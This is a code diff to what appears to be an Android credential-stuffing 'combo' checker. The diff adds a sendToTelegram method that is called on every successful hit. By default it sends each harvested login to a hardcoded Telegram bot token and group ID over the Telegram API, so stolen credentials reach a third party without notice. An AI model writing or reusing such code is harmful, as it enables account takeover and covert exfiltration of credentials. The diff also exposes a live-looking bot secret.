@@ -194,6 +194,7 @@ public class ScanService extends Service {
                             listener.onHitFound(hit);
                         }
                         saveHitToFile(hit, panel);
+                        sendToTelegram(hit);
                     } else {
                         failsCount.incrementAndGet();
                     }
@@ -206,6 +207,26 @@ public class ScanService extends Service {
         } catch (IOException | JSONException e) {
             failsCount.incrementAndGet();
             Log.e("ScanService", "Erro ao verificar combo: " + e.getMessage());
+        }
+    }
+
+    private void sendToTelegram(Hit hit) {
+        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+        boolean telegramEnabled = prefs.getBoolean("telegram_enabled", true);
+        if (!telegramEnabled) {
+            return;
+        }
+
+        String botToken = prefs.getString("telegram_bot_token", "8245169261:AAHTUygk3X99DtXysRwkPcjM7cYo0-FNpcQ");
+        String groupId = prefs.getString("telegram_group_id", "-1002710854837");
+        String message = hit.getFormattedText();
+
+        try {
+            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + groupId + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+            Request request = new Request.Builder().url(url).build();
+            httpClient.newCall(request).execute();
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 
